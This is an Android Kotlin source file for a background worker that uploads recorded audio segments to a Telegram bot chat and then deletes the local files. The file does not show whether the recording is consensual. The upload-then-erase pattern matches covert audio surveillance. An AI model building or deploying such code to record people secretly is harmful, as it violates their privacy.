package com.bcs.recox

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class UploadWorker(appContext: Context, params: WorkerParameters) : CoroutineWorker(appContext, params) {
    override suspend fun doWork(): Result {
        val path = inputData.getString("path") ?: return Result.failure()
        val ts = inputData.getString("ts") ?: "segment"
        val file = File(path)
        if (!file.exists()) return Result.success() // already deleted

        val bot = Prefs.getBotToken(applicationContext)
        val chat = Prefs.getChatId(applicationContext)
        if (bot.isEmpty() || chat.isEmpty()) return Result.failure()

        val client = OkHttpClient.Builder().callTimeout(2, TimeUnit.MINUTES).build()
        val url = "https://api.telegram.org/bot$bot/sendAudio"
        val mediaType = "audio/3gpp".toMediaTypeOrNull()
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chat)
            .addFormDataPart("caption", "RecoX: $ts")
            .addFormDataPart("audio", file.name, file.asRequestBody(mediaType))
            .build()
        val req = Request.Builder().url(url).post(body).build()
        return try {
            client.newCall(req).execute().use { resp ->
                if (resp.isSuccessful) {
                    file.delete()
                    Result.success()
                } else {
                    Result.retry()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Result.retry()
        }
    }
}
